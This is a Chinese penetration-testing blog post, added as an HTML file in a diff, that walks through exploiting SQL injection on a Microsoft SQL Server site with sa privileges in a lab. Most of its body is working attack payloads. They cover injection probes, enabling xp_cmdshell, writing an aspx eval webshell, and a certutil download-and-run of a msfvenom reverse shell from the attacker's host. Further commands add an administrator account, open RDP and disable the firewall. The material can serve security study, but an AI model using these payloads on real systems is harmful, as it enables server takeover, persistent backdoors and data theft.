@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>Microsoft SQL Server手注之Sa权限多种处理姿势 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Microsoft SQL Server手注之Sa权限多种处理姿势</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 23, 2020&nbsp;&nbsp;16:34:03</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="MSSQL注入探测"><a href="#MSSQL注入探测" class="headerlink" title="MSSQL注入探测"></a>MSSQL注入探测</h2><h3 id="MSSQL权限划分"><a href="#MSSQL权限划分" class="headerlink" title="MSSQL权限划分"></a>MSSQL权限划分</h3><p>三个权限：<code>sysadmin</code>、<code>db_owner</code>、<code>public</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysadmin：可以执行所有操作</span><br><span class="line">db_owner：可以执行数据库操作</span><br><span class="line">public：只能执行查询操作</span><br></pre></td></tr></table></figure>
+
+<h3 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h3><p>注入点：<a target="_blank" rel="noopener" href="http://192.168.159.135:8080/post.aspx">http://192.168.159.135:8080/post.aspx</a></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1470.png" alt="图片"></p>
+<p>加了一个单引号报错：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1471.png" alt="图片"></p>
+<p>存在注入，而且网站路径为： <code>c:\Inetpub\mssql-sql\post.aspx</code></p>
+<h3 id="判断是否是MSSQL"><a href="#判断是否是MSSQL" class="headerlink" title="判断是否是MSSQL"></a>判断是否是MSSQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and exists (select * from sysobjects)  and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1472.png" alt="图片"></p>
+<h3 id="判断MSSQL版本"><a href="#判断MSSQL版本" class="headerlink" title="判断MSSQL版本"></a>判断MSSQL版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and 1=(select @@VERSION)  and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1473.png" alt="图片"></p>
+<h3 id="判断当前数据库名"><a href="#判断当前数据库名" class="headerlink" title="判断当前数据库名"></a>判断当前数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; And 1=(select db_name())  and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1474.png" alt="图片"></p>
+<h3 id="判断是否是系统管理员权限sa"><a href="#判断是否是系统管理员权限sa" class="headerlink" title="判断是否是系统管理员权限sa"></a>判断是否是系统管理员权限sa</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and 1=(select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))  and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1475.png" alt="图片"></p>
+<h2 id="xp-cmdshell执行命令"><a href="#xp-cmdshell执行命令" class="headerlink" title="xp_cmdshell执行命令"></a>xp_cmdshell执行命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;ipconfig&quot; --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1476.png" alt="图片"></p>
+<p>虽然系统执行了，但是系统没回显给我们！这是为什么呢？</p>
+<p>是因为我们只能执行命令后吧结果保存到一张表里，然后我们通过<code>sql</code>语句来查询这条表才能看到执行的命令结果！</p>
+<p>我们在<code>MSSQL</code>客户端是可以执行回显的：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1477.png" alt="图片"></p>
+<h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>低权限也可以写webshell，只要是<code>写权限</code>就可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有回显：有回显那么我们直接就可以找到webshell的路径</span><br><span class="line">无回显：无回显就只能瞎鸡巴乱懵，看网站存放文件的规则然后Fuzz</span><br></pre></td></tr></table></figure>
+
+<p>因为我们是一个<code>sa</code>的高权限了，我们就可以让它执行一些其他命令来<code>反弹shell</code>或者说是写一个<code>webshell</code>到网站服务器里！</p>
+<p>之前我们得到网站的绝对路径是 <code>c:\Inetpub\mssql-sql\post.aspx</code> ，下面这条语句就可以写文件进去了，我们先随便写一段话进去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;echo saulGoodman&gt;c:\Inetpub\mssql-sql\1.txt&quot; --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1478.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1479.png" alt="图片"></p>
+<p>上帝视角看看：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1480.png" alt="图片"></p>
+<p>由上图可见，我们成功写入 <code>saulGoodman</code> 内容到了<code>1.txt</code>里！</p>
+<h2 id="小技巧-如何判断它是能执行命令的呢？"><a href="#小技巧-如何判断它是能执行命令的呢？" class="headerlink" title="小技巧:如何判断它是能执行命令的呢？"></a>小技巧:如何判断它是能执行命令的呢？</h2><p>我们可以执行这条命令让他去<code>ping</code> 网站<code>10</code>次：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;ping -n 10 www.saulgoodman.cn&quot; --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1481.png" alt="图片"></p>
+<p><code>ping -n 10 www.saulgoodman.cn</code> ，这条命令的意思是使用<code>ping</code>命令去像<code>www.saulgoodman.cn</code>去发送<code>10条数据包</code>！如果网站<code>延迟了10秒</code>左右说明我们的命令是可以执行的！</p>
+<p>如果没有执行的话，说明它没有开启<code>xp_cmdshell</code>，那么我们可以使用下面的语句去开启他：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br><span class="line">关闭的话就吧1修改为0</span><br></pre></td></tr></table></figure>
+
+<h2 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h2><p><code>aspx</code> 一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% @Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;saul&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>写入语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &#x27;echo ^&lt;^%^@Page Language=^&quot;^Jscript^&quot;^%^&gt;^&lt;^%^eval(Request.Item^[^&quot;saul^&quot;^]^,^&quot;unsafe^&quot;)^;^%^&gt;&gt;c:\Inetpub\mssql-sql\1.aspx&#x27;--</span><br><span class="line">注意！如果echo 里面的字符有引号和其他符号，那么我们就要在引号前面加一个 ^ 来转义它！记得用单引号包裹里面的一句话！</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1482.png" alt="图片"></p>
+<p>上帝视角看看：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1483.png" alt="图片"></p>
+<p>由上图可见，我们成功写入到了网站根目录！</p>
+<p>蚁剑连接成功：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1484.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1485.png" alt="图片"></p>
+<p>这样我们就通过注入点来拿到了一个Webshell！</p>
+<h2 id="下载执行反向远程控制服务端（木马）"><a href="#下载执行反向远程控制服务端（木马）" class="headerlink" title="下载执行反向远程控制服务端（木马）"></a>下载执行反向远程控制服务端（木马）</h2><p>首先要让对方下载我们的恶意文件，那么我们需要有一个<code>服务端</code>，用<code>python</code>开启一个服务端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1486.png" alt="图片"></p>
+<p>有了服务端，然后我们在<code>KALI</code>上生成一个反向木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.159.128 lport=8888 -f exe &gt;8888.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1487.png" alt="图片"></p>
+<p>这个时候我们的木马地址就是：<code>http://192.168.159.128:9000/8888.exe</code></p>
+<p>最后<code>MSF</code>开启监听等待肉鸡上线：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1488.png" alt="图片"></p>
+<p>准备工作完成后，我们就可以在注入点上去执行这条命令：（只能2008以上，2003测试失败）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原命令：</span><br><span class="line">certutil -urlcache -split -f http://192.168.159.128:9000/8888.exe 8888.exe</span><br><span class="line">加上注入语句：</span><br><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;certutil -urlcache -split -f http://192.168.159.128:9000/8888.exe 8888.exe&quot; --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1489.png" alt="图片"></p>
+<p>然后我们执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;8888.exe&quot; --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1490.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1491.png" alt="图片"></p>
+<p>或者还可以一条命令完成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;certutil -urlcache -split -f http://192.168.159.128:9000/8888.exe 8888.exe &amp;&amp;8888.exe&quot; --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1492.png" alt="图片"></p>
+<p>成功上线！</p>
+<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>PS：当前权限是有添加用户的权限，需要<code>administrator</code>或<code>system</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加用户 saul 并提升为管理员组：</span><br><span class="line">net user saul saul123... /add &amp;&amp; net localgroup administrators saul /add</span><br><span class="line">添加 saul 为远程桌面组（有的时候需要添加到远程桌面组才能登陆3308）：</span><br><span class="line">net localgroup &quot;Remote Management Users&quot; saul /add</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;net user saul saul123... /add&amp;net localgroup administrators saul /add&quot;--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1493.png" alt="图片"></p>
+<p>上帝视角看看：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1494.png" alt="图片"></p>
+<p>登陆远程桌面：<code>mstsc</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1495.png" alt="图片"></p>
+<p>可以看到登陆成功！</p>
+<p>PS：如果登陆之后我们需要吧<code>用户注销</code>！不然用户还是在登陆状态中的！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1496.png" alt="图片"></p>
+<p>完成了一些后渗透操作记得要把<code>用户删除</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user saul /del</span><br></pre></td></tr></table></figure>
+
+<p>那么还有一种情况是目标<code>没有开3389</code>又或者是<code>开启了防火墙</code>！</p>
+<p>那么就可以执行命令让他<code>开3389</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>关闭防火墙命令（慎用）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/03/23/SQL-MsSQL-5/">http://example.com/2020/03/23/SQL-MsSQL-5/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"># 漏洞原理</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/MsSQL/"># MsSQL</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/23/SQL-MsSQL-6/">Microsoft SQL Server手注之db_owner权限处理</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/12/SQL-MsSQL-4/">Microsoft SQL Server手注之延时型时间盲注</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
